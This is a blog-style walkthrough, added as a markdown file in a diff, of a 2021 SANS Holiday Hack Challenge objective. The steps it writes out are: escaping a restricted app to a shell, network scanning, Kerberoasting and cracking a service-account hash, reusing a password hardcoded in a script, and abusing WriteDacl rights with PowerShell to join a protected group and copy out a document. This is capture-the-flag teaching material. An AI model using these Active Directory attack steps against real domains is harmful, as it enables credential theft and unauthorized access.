@@ -1,0 +1,718 @@
+---
+title:  "Objective 8: Kerberoasting on an Open Fire - 2021 SANS Holiday Hack Challenge"
+date:   "2022-01-05 00:08:00 -0800"
+categories: HolidayHack2021
+header:
+ teaser: /assets/images/HolidayHack2021/kringlecon_2021_pic.jpg
+---
+
+This time, we're going to be attacking Active Directory.
+
+[Play the 2021 SANS Holiday Hack Challenge](https://2021.kringlecon.com/invite)
+
+## Objective
+> Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the [ElfU Portal](https://register.elfu.org/).
+
+## Hints
+- Investigating Active Directory errors is harder without [Bloodhound](https://github.com/BloodHoundAD/BloodHound), but there are [native](https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell) [methods](https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf).
+- Learn about [Kerberoasting](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) to leverage domain credentials to get usernames and crackable hashes for service accounts.
+- Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!
+- Check out [Chris Davis' talk](https://www.youtube.com/watch?v=iMh8FTzepU4) [and scripts](https://github.com/chrisjd20/hhc21_powershell_snippets) on Kerberoasting and Active Directory permissions abuse.
+- There will be some `10.X.X.X` networks in your routing tables that may be interesting. Also, consider adding `-PS22,445` to your `nmap` scans to "fix" default probing for unprivileged scans.
+- [OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules) is great for mangling when a password dictionary isn't enough.
+- [CeWL](https://github.com/digininja/CeWL) can generate some great wordlists from websites, but it will ignore digits in terms by default.
+
+## Inititial access
+The link in the objective takes us here: https://register.elfu.org/register
+
+This gets us to a registration page. Let's register for an account. We get a username and password back, in addition to an SSH command.
+
+SSH-ing to that server using the given command presents us with the following prompt:
+
+```
+===================================================
+=      Elf University Student Grades Portal       =
+=          (Reverts Everyday 12am EST)            =
+===================================================
+1. Print Current Courses/Grades.
+e. Exit
+:
+```
+
+`e` just closes the connection. Entering `1` gives us a report card and no additional options. Looks like we need to escape this little app first.
+
+After some trial and error, hitting `CTRL+D` gets us out of the app and into an interactive python session. Nice!
+
+**Note:** `CTRL+D` is the EOF or End of File command in python, and typically closes python programs.
+
+Now all we have to do is spawn a shell for ourselves. This is easy enough with python's built-in [subprocess](https://docs.python.org/3/library/subprocess.html) module:
+```python
+import subprocess
+subprocess.call('/bin/bash -i', shell=True)
+```
+
+## Finding the Domain Controller
+Let's try finding the domain controller. One of the hints tells us that "there will be some `10.X.X.X` networks in your routing tables that may be interesting", so let's look for those using `netstat`:
+```bash
+netstat -rn
+```
+
+Output:
+```
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         172.17.0.1      0.0.0.0         UG        0 0          0 eth0
+10.128.1.0      172.17.0.1      255.255.255.0   UG        0 0          0 eth0
+10.128.2.0      172.17.0.1      255.255.255.0   UG        0 0          0 eth0
+10.128.3.0      172.17.0.1      255.255.255.0   UG        0 0          0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0
+```
+
+So 10.128.0.0/22 (i.e. 10.128.0.0-10.128.3.255) is the subnet we should be looking through. Let's look for possible domain controllers on the network then:
+
+```bash
+nmap -sV -p 636 -oG 'nmap.scan' -PS22,445 '10.128.0.0/22'
+```
+Here's what each of the parts of this command are doing:
+- **-sV**: enumerate services and versions
+- **-p 636**: scan port 636, which is the port used for the Lightweight Directory Access Protocol (LDAP)
+- **-oG 'nmap.scan'**: output in a grep-able format and call the output file nmap.scan
+- **-PS22,445**: do TCP SYN discovery on ports 22 and 445 (per the hint)
+- **'10.128.0.0/22'** : the IP range we're scanning
+
+Then to search for the domain controller, we can just `grep` through the results:
+```bash
+cat nmap.scan | grep open
+```
+
+Output:
+```
+Host: 10.128.1.53 (hhc21-windows-dc.c.holidayhack2021.internal) Ports: 636/open/tcp//tcpwrapped///
+Host: 10.128.3.30 ()    Ports: 636/open/tcp//ssl|ldap//(Anonymous bind OK)/
+```
+
+So we have two potential IPs: 10.128.1.53 and 10.128.3.30. Let's gather some additional info on these hosts:
+
+```bash
+nmap -sV -sC -p- -PS22,445 10.128.1.53 10.128.3.30
+```
+
+### 10.128.1.53
+```
+Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
+Host is up (0.00053s latency).
+Not shown: 65514 filtered ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-27 23:25:10Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: ELFU
+|   NetBIOS_Domain_Name: ELFU
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: elfu.local
+|   DNS_Computer_Name: DC01.elfu.local
+|   DNS_Tree_Name: elfu.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-12-27T23:27:27+00:00
+| ssl-cert: Subject: commonName=DC01.elfu.local
+| Not valid before: 2021-10-28T19:21:37
+|_Not valid after:  2022-04-29T19:21:37
+|_ssl-date: 2021-12-27T23:28:05+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName=hhc21-windows-dc
+| Subject Alternative Name: DNS:hhc21-windows-dc
+| Not valid before: 2021-10-26T18:27:04
+|_Not valid after:  2022-10-26T18:27:04
+|_ssl-date: 2021-12-27T23:28:05+00:00; 0s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+9389/tcp  open  mc-nmf        .NET Message Framing
+49671/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49678/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=12/27%Time=61CA4B5B%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-12-27T23:27:30
+|_  start_date: N/A
+```
+
+### 10.128.3.30
+```
+Nmap scan report for 10.128.3.30
+Host is up (0.00030s latency).
+Not shown: 65501 closed ports
+PORT     STATE SERVICE      VERSION
+22/tcp   open  ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8c:b0:2b:dd:7f:c0:a5:da:7d:fb:8b:49:47:0a:64:bb (RSA)
+|   256 17:17:3c:96:a6:c6:84:0e:90:84:30:22:89:97:8c:8b (ECDSA)
+|_  256 f2:52:26:92:b8:9e:d8:fd:79:0c:b4:9a:c2:a2:12:eb (ED25519)
+53/tcp   open  domain       (generic dns response: NOTIMP)
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http         Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was http://10.128.3.30/register
+88/tcp   open  kerberos-sec Heimdal Kerberos (server time: 2021-12-27 23:25:10Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: ELFU)
+389/tcp  open  ldap         (Anonymous bind OK)
+| ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration
+| Not valid before: 2021-10-29T19:30:08
+|_Not valid after:  2023-09-29T19:30:08
+|_ssl-date: 2021-12-27T23:28:58+00:00; +53s from scanner time.
+445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: ELFU)
+464/tcp  open  kpasswd5?
+636/tcp  open  ssl/ldap     (Anonymous bind OK)
+| ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration
+| Not valid before: 2021-10-29T19:30:08
+|_Not valid after:  2023-09-29T19:30:08
+|_ssl-date: 2021-12-27T23:28:41+00:00; +36s from scanner time.
+1024/tcp open  msrpc        Microsoft Windows RPC
+1025/tcp open  tcpwrapped
+1026/tcp open  tcpwrapped
+1027/tcp open  tcpwrapped
+1028/tcp open  tcpwrapped
+1029/tcp open  tcpwrapped
+1030/tcp open  tcpwrapped
+1031/tcp open  tcpwrapped
+1032/tcp open  tcpwrapped
+1033/tcp open  tcpwrapped
+1034/tcp open  tcpwrapped
+1035/tcp open  tcpwrapped
+1036/tcp open  tcpwrapped
+1037/tcp open  tcpwrapped
+1038/tcp open  tcpwrapped
+1039/tcp open  tcpwrapped
+1040/tcp open  tcpwrapped
+1041/tcp open  tcpwrapped
+1042/tcp open  tcpwrapped
+1043/tcp open  tcpwrapped
+1044/tcp open  tcpwrapped
+2222/tcp open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+3268/tcp open  ldap         (Anonymous bind OK)
+| ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration
+| Not valid before: 2021-10-29T19:30:08
+|_Not valid after:  2023-09-29T19:30:08
+|_ssl-date: 2021-12-27T23:30:12+00:00; +2m07s from scanner time.
+3269/tcp open  ssl/ldap     (Anonymous bind OK)
+| ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration
+| Not valid before: 2021-10-29T19:30:08
+|_Not valid after:  2023-09-29T19:30:08
+|_ssl-date: 2021-12-27T23:29:59+00:00; +1m54s from scanner time.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=12/27%Time=61CA4B5B%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,2B,"\0\)\0\x06\x81\x80\0\x01\0\0\0\0\0\x01\x07version
+SF:\x04bind\0\0\x10\0\x03\0\0\)\x02\0\0\0\0\0\0\0")%r(DNSStatusRequestTCP,
+SF:E,"\0\x0c\0\0\x90\x04\0\0\0\0\0\0\0\0");
+Service Info: Host: SHARE30; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 47s, deviation: 53s, median: 35s
+|_nbstat: NetBIOS name: SHARE30, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: share30
+|   NetBIOS computer name: SHARE30\x00
+|   Domain name: elfu.local
+|   FQDN: share30.elfu.local
+|_  System time: 2021-12-27T23:27:30+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-12-27T23:27:30
+|_  start_date: N/A
+```
+
+From this, we can pretty safely assume from this that the domain is "elfu.local". There are also some SMB shares on 10.128.3.30. Let's check those out.
+
+## SMB Shares
+
+ Let's see what those shares are:
+```bash
+smbclient -L \\\\10.128.3.30\\
+```
+
+output:
+```
+Sharename       Type      Comment
+---------       ----      -------
+netlogon        Disk      
+sysvol          Disk      
+elfu_svc_shr    Disk      elfu_svc_shr
+research_dep    Disk      research_dep
+IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+SMB1 disabled -- no workgroup available
+```
+
+We can try to log into the shares with:
+
+```bash
+smbclient \\\\10.28.3.30\\<SHARE NAME>
+```
+
+None of the shares we have access to have anything interesting in them.
+
+## Kerberoasting
+Let's see if we can do any Kerberoasting. We'll use [Impacket](https://github.com/SecureAuthCorp/impacket)'s GetUserSPNs.py:
+
+Copy/paste the file from [GitHub](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) directly into a file called GetUserSPNs.py and then run it.
+
+```bash
+GetUserSPNs.py -outputfile spns.txt elfu.local/<USERNAME>:<PASSWORD>
+```
+
+Output:
+```
+ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation 
+-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
+ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 22:41:44.214743             
+ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 22:41:44.214743             
+ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 22:41:44.214743             
+ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 22:41:44.214743
+```
+
+Looks like the saved SPN hash will give us access to the `elfu_svc` user if we can crack it.
+
+We can print out the hash
+```bash
+cat spns.txt
+```
+and then copy/paste the contents of `spns.txt` right to our machine so we can crack it.
+
+## Creating a Wordlist
+From guidance in the hints, we can assume we're going to be using cewl. We can run all of these commands on our own machine. [Ippsec's video on Fuse from HackTheBox](https://www.youtube.com/watch?v=VxbC03xmS60&t=565s&ab_channel=IppSec) is a pretty good demo of these tools.
+
+```bash
+cewl -d 7 -m 8 --with-numbers -w cewl.out https://register.elfu.org/register
+```
+
+This gives us `cewl.out`, which contiains a custom list of some potential passwords.
+
+This is a good start. Now let's mangle it using [OneRuleToRuleThemAll](https://github.com/NotSoSecure/password_cracking_rules).
+
+We'll clone the repository
+
+```bash
+git clone https://github.com/NotSoSecure/password_cracking_rules.git
+```
+
+and run hashcat
+
+```bash
+hashcat cewl.out -r password_cracking_rules/OneRuleToRuleThemAll.rule --stdout > mangled_list.txt
+```
+
+**NOTE:** After running this, check to make sure that the mangled list is UTF-8 encoded. Otherwise hashcat won't parse it properly.
+
+## Cracking the hash
+We can use hashcat again to crack the hash:
+```bash
+hashcat -m 13100 mangled_list.txt spns.txt
+```
+
+This gives us a password of `Snow2021!`
+
+
+## Checking out the SMB Shares Again
+One of the SMB Shares was called `elfu_svc_shr`. Sounds like our `elfu_svc` user probably has access to it.
+
+```bash
+smbclient -U elfu_svc  \\\\10.128.3.30\\elfu_svc_shr
+```
+
+Input the password and we're in!
+
+Running `ls` shows us a whole bunch of powershell scripts. Let's download them all so we can look through them.
+
+First, we'll create an `smb` folder in our home folder to keep things organized. `cd` into that folder. Then we'll go back into the smb share (same command as above) and execute the following:
+```bash
+prompt OFF
+mget *
+exit
+```
+
+Now if we run `ls` we can see all of the scripts in our local directory.
+
+The next step would be to see if there are any credentials for AD users that we can leverage. Grepping through the files just for strings like `password` was a bit too much to parse though. Maybe we can search for a username instead.
+
+## Enumerating AD users
+Let's just get the basics with GetADUsers.py from impacket.
+
+We'll copy/paste it straight from [GitHub](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetADUsers.py) into a file called `GetADUsers.py` again and run it:
+```bash
+GetADUsers.py -all elfu.local/<USERNAME>:<PASSWORD>
+```
+(use whatever valid AD credentials you want)
+
+This gives us a list of AD users. Two immediately pop out as interesting: `elfu_admin` and `remote_elf`
+
+
+## Looking through the scripts
+If we grep for those users, maybe we can get something.
+
+```bash
+grep -E '(remote_elf|elfu_admin)' *.ps1
+```
+**Note:** `-E` just tells grep that we're using a [regular expression](https://en.wikipedia.org/wiki/Regular_expression) as the filter.
+
+In the output is this line from `GetProcessInfo.ps1`:
+```powershell
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+```
+
+Let's see what that file is:
+```bash
+cat GetProcessInfo.ps1
+```
+
+Output:
+```powershell
+$SecStringPassword = "<GIANT ENCODED STRING>"
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
+```
+Looks like this is running a command on a remote machine that happens to be one of the domain controllers we saw earlier. Seems like this should be our next move.
+
+## Pivoting
+
+A bit of googling for powershell remoting gives us this microsoft doc on [running remote commands](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2). If we want a shell, we just need to swap out `Invoke-Command` for `Enter-PSSession` and delete a flag.
+
+Let's create a new script for ourselves to give us a remote shell as that user.
+
+```bash
+cp GetProcessInfo.ps1 ~\Get_Remote_Session.ps1
+```
+
+We'll change the last line of the new `Get_Remote_Session.ps1` file to this:
+```powershell                                                                                                   
+Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate 
+```
+
+Despite this box being a linux box, it does have powershell on it, so we can just use that to run this script cleanly:
+```bash
+powershell
+./Get_Remote_Session.ps1
+```
+
+And this drops us into a shell as the `remote_elf` user on the 10.128.1.53 box!
+
+## Getting Access to the Right Group
+Let's see a list of all of the AD groups in the domain:
+
+```powershell
+Get-ADGroup -filter *
+```
+
+This outputs a long list, but this group jumps out at me:
+
+```
+DistinguishedName : CN=Research Department,CN=Users,DC=elfu,DC=local
+GroupCategory     : Security
+GroupScope        : Global
+Name              : Research Department
+ObjectClass       : group
+ObjectGUID        : 8dd5ece3-bdc8-4d02-9356-df01fb0e5f3d
+SamAccountName    : ResearchDepartment
+SID               : S-1-5-21-2037236562-2033616742-1485113978-1108
+```
+(reminder that our goal in this challenge is to "Obtain the secret sleigh research document...")
+
+Do we have any privileges to edit that group? Let's check using the code from the talk in the hints.
+
+```powershell
+$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+```
+
+Looking through the output, we can see that we have access to the `WriteDacl` permission:
+
+```
+ActiveDirectoryRights : WriteDacl
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\remote_elf
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+```
+
+This means we can give whoever we want `GenericAll` permissions and then they can add whoever they want to the group. We can do that using another one of the code snippets from the talk:
+
+```powershell
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "bjswlxyudl"
+$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+$secOptions = $domainDirEntry.get_Options()
+$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+$domainDirEntry.RefreshCache()
+$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+```
+
+Running those same two ADSI commands again, we can see that our initial user now has `GenericAll` access.
+
+```
+ActiveDirectoryRights : GenericAll
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\<USERNAME>
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+```
+
+Now let's add our user to the group using another code snippet from the talk:
+
+```powershell
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "<USERNAME>"
+$password = "<PASSWORD>"
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
+$b=New-Object byte[] $sid.BinaryLength
+$sid.GetBinaryForm($b,0)
+$hexSID=[BitConverter]::ToString($b).Replace('-','')
+$domainDirEntry.Add("LDAP://<SID=$hexSID>")
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+```
+
+We can check to make sure it worked:
+
+```powershell
+Get-ADGroup -Identity 'ResearchDepartment' -Properties member | Select-Object -ExpandProperty member
+```
+
+The output contains our username, so we're good to go. (If it doesn't contain your username yet, wait a few minutes for it to propogate)
+
+Type `exit` twice to exit the remote powershell session and then the initial powershell session, sending us back to the linux shell.
+
+## Exfiltrate the File
+Now all we have to do is get the file back onto our local machine so we can read it.
+
+```bash
+smbclient \\\\10.128.3.30\\research_dep
+```
+
+If we run `ls`, we can see the file we need.
+
+```
+.                                   D        0  Thu Dec  2 16:39:42 2021
+..                                  D        0  Tue Dec 28 21:35:08 2021
+SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+```
+
+Now let's get it to our home directory:
+
+```bash
+prompt OFF
+mget SantaSecretToAWonderfulHolidaySeason.pdf
+exit
+```
+
+If we change our login shell from that app we got dropped into to something like `/bin/bash`, we should be able to exfiltrate this file.
+
+```bash
+chsh
+<ENTER YOUR PASSWORD>
+/bin/bash
+```
+
+Now we can use [scp](https://en.wikipedia.org/wiki/Secure_copy_protocol) to get the file to our local machine. (Run this on your local machine)
+
+```bash
+scp -P 2222 <USERNAME>@grades.elfu.org:~/*.pdf .
+```
+
+And now we can open up the PDF on our local machine to get our answer.
+
+**Answer:** Kindness
+
+## Extra Bits
+
+### AD Enumeration
+Got the following from  [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-ldap#manual)
+
+We'll start up python
+```bash
+python3
+```
+
+and grab info from the domain controller:
+```python
+import ldap3
+server = ldap3.Server('10.128.3.30', get_info = ldap3.ALL, port =636, use_ssl = True)
+connection = ldap3.Connection(server)
+connection.bind()
+server.info
+```
+
+output:
+```
+DSA info (from DSE):
+  Supported LDAP versions: 2, 3
+  Naming contexts: 
+    CN=Schema,CN=Configuration,DC=elfu,DC=local
+    CN=Configuration,DC=elfu,DC=local
+    DC=elfu,DC=local
+    DC=DomainDnsZones,DC=elfu,DC=local
+    DC=ForestDnsZones,DC=elfu,DC=local
+  Supported controls: 
+    1.2.840.113556.1.4.1338 - Verify name - Control - MICROSOFT
+    1.2.840.113556.1.4.1339 - Domain scope - Control - MICROSOFT
+    1.2.840.113556.1.4.1340 - Search options - Control - MICROSOFT
+    1.2.840.113556.1.4.1341 - RODC DCPROMO - Control - MICROSOFT
+    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
+    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
+    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
+    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
+    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
+    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
+    1.2.840.113556.1.4.1504 - Attribute scoped query - Control - MICROSOFT
+    1.2.840.113556.1.4.2064 - Show recycled - Control - MICROSOFT
+    1.2.840.113556.1.4.319 - LDAP Simple Paged Results - Control - RFC2696
+    1.2.840.113556.1.4.417 - LDAP server show deleted objects - Control - MICROSOFT
+    1.2.840.113556.1.4.473 - Sort Request - Control - RFC2891
+    1.2.840.113556.1.4.529 - Extended DN - Control - MICROSOFT
+    1.2.840.113556.1.4.801 - Security descriptor flags - Control - MICROSOFT
+    1.2.840.113556.1.4.801 - Security descriptor flags - Control - MICROSOFT
+    1.2.840.113556.1.4.805 - Tree delete - Control - MICROSOFT
+    1.2.840.113556.1.4.841 - Directory synchronization - Control - MICROSOFT
+  Supported features: 
+    1.2.840.113556.1.4.1670 - Active directory V51 - Feature - MICROSOFT
+    1.2.840.113556.1.4.1791 - Active directory LDAP Integration - Feature - MICROSOFT
+    1.2.840.113556.1.4.1935 - Active directory V60 - Feature - MICROSOFT
+    1.2.840.113556.1.4.2080 - Active directory V61 R2 - Feature - MICROSOFT
+    1.2.840.113556.1.4.800 - Active directory - Feature - MICROSOFT
+  Supported SASL mechanisms: 
+    GSS-SPNEGO, GSSAPI, NTLM
+  Schema entry: 
+    CN=Aggregate,CN=Schema,CN=Configuration,DC=elfu,DC=local
+Vendor name: Samba Team (http://samba.org)
+Vendor version: 4.3.11-Ubuntu
+Other:
+  configurationNamingContext: 
+    CN=Configuration,DC=elfu,DC=local
+  defaultNamingContext: 
+    DC=elfu,DC=local
+  rootDomainNamingContext: 
+    DC=elfu,DC=local
+  schemaNamingContext: 
+    CN=Schema,CN=Configuration,DC=elfu,DC=local
+  isSynchronized: 
+    TRUE
+  dsServiceName: 
+    CN=NTDS Settings,CN=SHARE30,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=elfu,DC=local
+  serverName: 
+    CN=SHARE30,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=elfu,DC=local
+  dnsHostName: 
+    share30.elfu.local
+  ldapServiceName: 
+    elfu.local:share30$@ELFU.LOCAL
+  currentTime: 
+    20211228003627.0Z
+  highestCommittedUSN: 
+    4826
+  domainFunctionality: 
+    3
+  forestFunctionality: 
+    3
+  domainControllerFunctionality: 
+    4
+  isGlobalCatalogReady: 
+    TRUE
+```
+
+This confirms that the domain is elfu.local. Nothing else terribly interesting here at a glance.
+
+
+### Searching for SMB shares
+Let's look for any file shares on that /22 network. SMB commonly runs on ports 139 and 445
+
+```bash
+nmap -p139,445 -PS22,445 -oX 'nmap.xml' --script smb-enum-shares --script-args smbusername='<USERNAME>',smbpassword='<PASSWORD>' '10.128.0.0/22'
+cat nmap.xml | grep 'table key'
+```
+
+output:
+```xml
+<table key="\\10.128.3.30\IPC$">
+<table key="\\10.128.3.30\elfu_svc_shr">
+<table key="\\10.128.3.30\netlogon">
+<table key="\\10.128.3.30\research_dep">
+<table key="\\10.128.3.30\sysvol">
+```
+
+so the only host with open shares of interest is 10.128.3.30.
+
+```bash
+smbclient -L \\\\10.128.3.30\\
+```
+
+output:
+```
+Sharename       Type      Comment
+---------       ----      -------
+netlogon        Disk      
+sysvol          Disk      
+elfu_svc_shr    Disk      elfu_svc_shr
+research_dep    Disk      research_dep
+IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+```
